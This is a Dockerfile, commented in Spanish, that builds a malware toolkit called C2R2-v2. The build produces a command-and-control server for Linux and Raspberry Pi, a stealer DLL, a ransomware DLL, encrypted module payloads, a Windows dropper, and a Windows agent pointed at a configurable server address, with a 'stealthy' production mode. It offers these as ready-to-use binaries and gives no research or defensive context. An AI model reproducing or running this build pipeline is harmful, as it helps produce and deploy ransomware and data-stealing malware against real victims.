# Dockerfile para compilar todos los componentes de C2R2-v2
# Genera binarios listos para usar: 
#   - Servidor (x86_64 Linux y ARM64 para Raspberry Pi)
#   - Agente Windows
#   - Builder y DLLs encriptadas

# Usar Debian 12 (Bookworm) que tiene GLIBC 2.36 compatible con Raspberry Pi OS
# Rust 1.88+ required for edition 2024 with let_chains support (dinvk crate dependency)
FROM rust:1.88-bookworm

# Instalar dependencias para compilación cruzada a Windows y ARM
RUN apt-get update && apt-get install -y \
    mingw-w64 \
    build-essential \
    gcc-aarch64-linux-gnu \
    g++-aarch64-linux-gnu \
    cmake \
    nasm \
    llvm \
    lld \
    && rm -rf /var/lib/apt/lists/*

# Configurar llvm-rc como rc.exe para que winres funcione
RUN ln -s /usr/bin/llvm-rc /usr/bin/x86_64-w64-mingw32-windres || true

# Agregar target de Windows
RUN rustup target add x86_64-pc-windows-gnu

# Agregar targets de Linux para el servidor
RUN rustup target add x86_64-unknown-linux-gnu
RUN rustup target add aarch64-unknown-linux-gnu

# Crear directorio de trabajo
WORKDIR /workspace

# Copiar el workspace completo
COPY . .

# Argumentos de compilación configurables
ARG SERVER_IP=0.0.0.0
ARG SERVER_PORT=4444
ARG AGENT_NAME=agent
ARG PRODUCTION_MODE=false

# Script de compilación
RUN mkdir -p /build_output

# 1a. Compilar el servidor (Linux x86_64)
RUN echo "🔨 Compilando servidor C2R2 (x86_64)..." && \
    cargo build --release --target x86_64-unknown-linux-gnu --package c2r2-server && \
    cp target/x86_64-unknown-linux-gnu/release/c2r2-server /build_output/c2r2-server && \
    chmod +x /build_output/c2r2-server && \
    echo "✅ Servidor x86_64 compilado: /build_output/c2r2-server"

# 1b. Compilar el servidor (ARM64 - Raspberry Pi)
RUN echo "🔨 Compilando servidor C2R2 (ARM64 - Raspberry Pi)..." && \
    CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc \
    cargo build --release --target aarch64-unknown-linux-gnu --package c2r2-server && \
    cp target/aarch64-unknown-linux-gnu/release/c2r2-server /build_output/c2r2-server-arm64 && \
    chmod +x /build_output/c2r2-server-arm64 && \
    echo "✅ Servidor ARM64 compilado: /build_output/c2r2-server-arm64"

# 2. Compilar stealer DLL
RUN echo "🔨 Compilando stealer.dll..." && \
    cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll && \
    cp target/x86_64-pc-windows-gnu/release/stealer.dll /build_output/stealer.dll && \
    echo "✅ Stealer DLL compilado: /build_output/stealer.dll"

# 3. Compilar ransomware DLL
RUN echo "🔨 Compilando ransomware.dll..." && \
    cargo build --release --target x86_64-pc-windows-gnu --package ransomware-dll && \
    cp target/x86_64-pc-windows-gnu/release/ransomware.dll /build_output/ransomware.dll && \
    echo "✅ Ransomware DLL compilado: /build_output/ransomware.dll"

# 4a. Compilar el builder (Linux x86_64)
RUN echo "🔨 Compilando builder (x86_64)..." && \
    cargo build --release --target x86_64-unknown-linux-gnu --package builder && \
    cp target/x86_64-unknown-linux-gnu/release/builder /build_output/builder && \
    chmod +x /build_output/builder && \
    echo "✅ Builder x86_64 compilado: /build_output/builder"

# 4b. Compilar el builder (Linux ARM64)
RUN echo "🔨 Compilando builder (ARM64)..." && \
    CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc \
    cargo build --release --target aarch64-unknown-linux-gnu --package builder && \
    cp target/aarch64-unknown-linux-gnu/release/builder /build_output/builder-arm64 && \
    chmod +x /build_output/builder-arm64 && \
    echo "✅ Builder ARM64 compilado: /build_output/builder-arm64"

# 4c. Compilar el dropper (Windows) - con features de producción
RUN echo "🔨 Compilando dropper..." && \
    cargo build --release --target x86_64-pc-windows-gnu --package dropper --features production && \
    cp target/x86_64-pc-windows-gnu/release/dropper.exe /build_output/dropper.exe && \
    echo "✅ Dropper compilado: /build_output/dropper.exe"

# 5. Encriptar módulos usando el builder
RUN echo "🔐 Encriptando módulo stealer..." && \
    /build_output/builder encrypt-module --module stealer && \
    echo "✅ Stealer encriptado"

RUN echo "🔐 Encriptando módulo ransomware..." && \
    /build_output/builder encrypt-module --module ransomware && \
    echo "✅ Ransomware encriptado"

# 6. Copiar módulos encriptados
RUN mkdir -p /build_output/modules && \
    cp c2r2-server/modules/*.enc /build_output/modules/ 2>/dev/null || true && \
    cp c2r2-server/modules/*.key /build_output/modules/ 2>/dev/null || true && \
    echo "✅ Módulos encriptados copiados a /build_output/modules"

# 7. Configurar variables de entorno para winres con llvm-rc
ENV RC=llvm-rc \
    AR_x86_64_pc_windows_gnu=llvm-ar \
    WINDRES_x86_64_pc_windows_gnu=llvm-rc

# 8. Compilar el agente con configuración específica
RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." && \
    if [ "$PRODUCTION_MODE" = "true" ]; then \
        /build_output/builder build-agent \
            --name "${AGENT_NAME}" \
            --server "${SERVER_IP}:${SERVER_PORT}" \
            --production; \
    else \
        /build_output/builder build-agent \
            --name "${AGENT_NAME}" \
            --server "${SERVER_IP}:${SERVER_PORT}"; \
    fi && \
    cp ${AGENT_NAME}.exe /build_output/${AGENT_NAME}.exe && \
    echo "✅ Agente compilado: /build_output/${AGENT_NAME}.exe"

# Crear un resumen de los binarios generados
RUN echo "📦 RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
    echo "========================" >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "Servidor C2:" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/c2r2-server >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "Servidor C2R2 (ARM64 - Raspberry Pi):" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/c2r2-server-arm64 >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "Agente Windows:" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/${AGENT_NAME}.exe >> /build_output/BUILD_INFO.txt && \
    echo "  Configurado para: ${SERVER_IP}:${SERVER_PORT}" >> /build_output/BUILD_INFO.txt && \
    echo "  Modo: $(if [ "$PRODUCTION_MODE" = "true" ]; then echo "PRODUCCIÓN (stealthy)"; else echo "DESARROLLO (debug)"; fi)" >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "Builder (x86_64):" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/builder >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "Builder (ARM64):" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/builder-arm64 >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "Dropper (Windows):" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/dropper.exe >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "DLLs:" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/*.dll >> /build_output/BUILD_INFO.txt && \
    echo "" >> /build_output/BUILD_INFO.txt && \
    echo "Módulos encriptados:" >> /build_output/BUILD_INFO.txt && \
    ls -lh /build_output/modules/ >> /build_output/BUILD_INFO.txt && \
    cat /build_output/BUILD_INFO.txt

# Script de copia que se ejecuta cuando el contenedor inicia
RUN echo '#!/bin/bash' > /entrypoint.sh && \
    echo 'set -e' >> /entrypoint.sh && \
    echo 'echo "📦 Copiando binarios compilados a /output..."' >> /entrypoint.sh && \
    echo 'cp -r /build_output/* /output/' >> /entrypoint.sh && \
    echo 'echo "✅ Binarios copiados exitosamente a /output"' >> /entrypoint.sh && \
    echo 'echo ""' >> /entrypoint.sh && \
    echo 'cat /output/BUILD_INFO.txt' >> /entrypoint.sh && \
    chmod +x /entrypoint.sh

# El directorio /output contiene todos los binarios listos para usar
VOLUME ["/output"]

# Copiar binarios al volumen cuando el contenedor inicia
ENTRYPOINT ["/entrypoint.sh"]
